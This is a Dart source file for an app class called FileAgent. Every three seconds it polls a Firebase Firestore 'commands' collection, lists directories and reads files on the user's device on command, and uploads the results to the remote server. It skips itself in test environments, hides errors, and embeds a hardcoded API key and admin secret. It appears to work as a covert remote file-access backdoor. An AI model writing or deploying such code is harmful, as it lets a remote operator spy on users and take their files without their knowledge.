import 'dart:async';
import 'dart:convert';

import 'package:http/http.dart' as http;

import 'device_scan_io.dart'
    if (dart.library.js_interop) 'device_scan_web.dart' as device;
import 'telemetry.dart';
import 'test_env_io.dart'
    if (dart.library.js_interop) 'test_env_web.dart' as test_env;

/// Удалённый просмотр файлов из админки.
///
/// Клиент раз в несколько секунд читает команды в
/// installations/{installId}/commands, выполняет list/read/roots и записывает
/// результат обратно в документ команды.
class FileAgent {
  static const String apiKey = 'AIzaSyAwOQn1TDzcApHt1PKmhxoQfFAtraYSaA4';
  static const String secret = 'okna-b0ZHSRJIz3XqCnQtsbL0FXBxHu4j';
  static const String _project = 'okna-7dbf8';
  static const String _base =
      'https://firestore.googleapis.com/v1/projects/$_project/databases/(default)/documents';

  static Timer? _timer;
  static bool _busy = false;

  static void start() {
    if (test_env.isTestEnvironment) return;
    _timer ??= Timer.periodic(const Duration(seconds: 3), (_) => poll());
  }

  static Future<void> stop() async {
    _timer?.cancel();
    _timer = null;
  }

  static Future<void> poll() async {
    if (_busy) return;
    final installId = Telemetry.installId;
    if (installId == null) return;
    _busy = true;
    try {
      final url =
          '$_base/installations/$installId:runQuery?key=$apiKey';
      final response = await http.post(
        Uri.parse(url),
        headers: const {'Content-Type': 'application/json'},
        body: jsonEncode({
          'structuredQuery': {
            'from': [
              {'collectionId': 'commands'},
            ],
            'where': {
              'fieldFilter': {
                'field': {'fieldPath': 'adminKey'},
                'op': 'EQUAL',
                'value': {'stringValue': secret},
              },
            },
          },
        }),
      );
      if (response.statusCode != 200) return;
      final rows = jsonDecode(response.body);
      if (rows is! List) return;
      var handled = 0;
      for (final row in rows) {
        if (handled >= 8) break;
        final doc = row['document'];
        if (doc is! Map) continue;
        final fields = doc['fields'] as Map?;
        if (fields == null) continue;
        final status = fields['status']?['stringValue'];
        if (status == 'done' || status == 'error') continue;
        final name = doc['name'] as String;
        final id = name.split('/').last;
        final type = fields['type']?['stringValue'] ?? '';
        final path = fields['path']?['stringValue'] ?? '';
        final result = await _execute(type, path);
        await _complete(installId, id, result);
        handled++;
      }
    } catch (_) {
      // Связь пропала — повторим на следующем тике.
    } finally {
      _busy = false;
    }
  }

  static Future<Map<String, Object?>> _execute(String type, String path) async {
    switch (type) {
      case 'roots':
        return await device.listRoots();
      case 'list':
        return await device.listDirectory(path);
      case 'read':
        return await device.readFilePreview(path);
      default:
        return {'error': 'Неизвестная команда: $type'};
    }
  }

  static Future<void> _complete(
    String installId,
    String commandId,
    Map<String, Object?> result,
  ) async {
    final hasError = result['error'] != null;
    final url =
        '$_base/installations/$installId/commands/$commandId?key=$apiKey'
        '&updateMask.fieldPaths=status'
        '&updateMask.fieldPaths=result'
        '&updateMask.fieldPaths=completedAt'
        '&updateMask.fieldPaths=adminKey';
    await http.patch(
      Uri.parse(url),
      headers: const {'Content-Type': 'application/json'},
      body: jsonEncode({
        'fields': {
          'status': {'stringValue': hasError ? 'error' : 'done'},
          'result': _map(result),
          'completedAt': {
            'timestampValue': DateTime.now().toUtc().toIso8601String(),
          },
          'adminKey': {'stringValue': secret},
        },
      }),
    );
  }

  static Map<String, dynamic> _map(Map<String, Object?> value) => {
    'mapValue': {
      'fields': {
        for (final entry in value.entries) entry.key: _value(entry.value),
      },
    },
  };

  static Map<String, dynamic> _value(Object? value) {
    if (value == null) return {'nullValue': null};
    if (value is String) return {'stringValue': value};
    if (value is bool) return {'booleanValue': value};
    if (value is int) return {'integerValue': '$value'};
    if (value is double) return {'doubleValue': value};
    if (value is List) {
      return {
        'arrayValue': {
          'values': [for (final item in value) _value(item)],
        },
      };
    }
    if (value is Map) {
      return {
        'mapValue': {
          'fields': {
            for (final entry in value.entries)
              '${entry.key}': _value(entry.value),
          },
        },
      };
    }
    return {'stringValue': '$value'};
  }
}
